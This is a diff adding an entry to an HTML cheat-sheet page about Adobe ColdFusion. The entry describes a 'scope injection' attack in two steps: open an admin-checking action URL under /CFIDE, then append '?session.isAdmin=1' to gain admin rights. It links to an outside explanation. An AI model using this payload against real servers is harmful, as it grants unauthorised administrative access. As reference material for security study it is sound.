@@ -705,6 +705,21 @@ completed query MyDBQuery; Query Execution time:
                         </div>
                     </div>
                 </div>
+				<div class="row">
+                    
+					<div class="col-md-6 col-lg-12">
+                        <div class="css-cheats">
+                            <div class="row justify-content-between align-items-center">
+                                <h5 class="col-xs-12 col-sm-12"># Adobe ColdFusion Server Scope Injection</h5>
+								<small  class="col-xs-12 col-sm-12">detailed information about the exploitation of this vulnerability: <a href="https://www.petefreitag.com/item/834.cfm">https://www.petefreitag.com/item/834.cfm</a></small>
+								<h6  class="col-xs-12 col-sm-12">1. open any action (that checks session.isAdmin) in browser</h6>
+                                <pre style="">http://www.example.com:8500/CFIDE/componentutils/componentdetail.cfm</pre>
+                                <h6  class="col-xs-12 col-sm-12">2. append the following to the url</h6>
+                                <pre style="">?session.isAdmin=1</pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
             </section>
             <footer>
                 <p>Built & Maintained by <a target="_blank" href="https://www.facebook.com/stefanneropejcic">Stefan Pejcic</a></p><small>ColdFusion is a trademark of Adobe Systems Incorporated.</small>
